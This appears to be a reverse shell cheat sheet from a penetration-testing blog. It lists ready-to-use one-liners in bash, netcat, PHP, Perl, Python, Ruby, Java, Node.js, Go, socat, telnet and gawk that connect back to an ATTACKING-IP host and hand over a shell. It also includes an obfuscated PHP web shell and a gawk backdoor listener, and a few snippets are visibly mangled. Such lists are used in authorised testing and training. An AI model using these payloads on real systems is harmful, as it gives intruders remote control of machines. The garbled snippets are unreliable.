## Bash Reverse Shells[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells)

```bash
exec /bin/bash 0&0 2>&0
```

```bash
0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/ATTACKING-IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

## socat Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#socat-reverse-shell)

Source: @filip_dragovic

```bash
socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
```

## Golang Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#golang-reverse-shell)

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
```

## PHP Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell)

A useful PHP reverse shell:

```bash
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

Another PHP reverse shell (that was submitted via Twitter):

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>
```

Base64 encoded by @0xInfection:

```
<?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
```

## Netcat Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell)

Useful netcat reverse shell examples:

Don't forget to start your listener, or you won't be catching any shells :)

```bash
nc -lnvp 80
```

```bash
nc -e /bin/sh ATTACKING-IP 80
```

```bash
/bin/sh | nc ATTACKING-IP 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

A reverse shell submitted by [@0xatul](https://twitter.com/atul_hax) which works well for OpenBSD netcat rather than GNU nc:

```bash
mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

## Node.js Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#nodejs-reverse-shell)

```bash
require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
```

Source: @jobertabma via @JaneScott

## Telnet Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell)

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

Remember to listen on 443 on the attacking machine also.

## Perl Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell)

```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl Windows Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell)

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell)

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Python Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Gawk Reverse Shell[](https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell)

Gawk one liner rev shell by @dmfroberson:

```gawk
gawk 'BEGIN {P=4444;S="> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
```

```gawk
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```